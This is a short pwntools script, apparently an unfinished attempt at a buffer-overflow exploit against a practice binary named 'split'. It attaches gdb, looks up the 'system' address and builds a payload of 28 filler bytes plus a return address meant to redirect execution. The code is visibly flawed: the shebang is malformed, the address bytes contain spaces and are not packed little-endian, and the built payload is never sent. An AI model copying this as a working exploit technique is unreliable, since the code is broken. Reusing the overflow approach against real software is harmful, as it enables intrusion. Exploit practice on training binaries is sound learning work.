#/usr/bin/python2
from pwn import *

# setup context
context.terminal = ['terminator','--new-tab','-x']

# Set up pwntools to work with this binary
elf = context.binary = ELF('split')
io = process(elf.path)
gdb.attach(io)
# Print out system address
#info("%#x system", elf.symbols.system)
system = p64(elf.symbols.system)
#for item in elf.symbols:
#	info(item)

io.recv()

# build payload
payload = "\x41" * 28 + "\x40 \x08 \x07"  # 28 A's and then usefulFunction address - 0x400807
print payload

# send the offset of 28 bytes
io.sendline('A'*28)
io.wait()
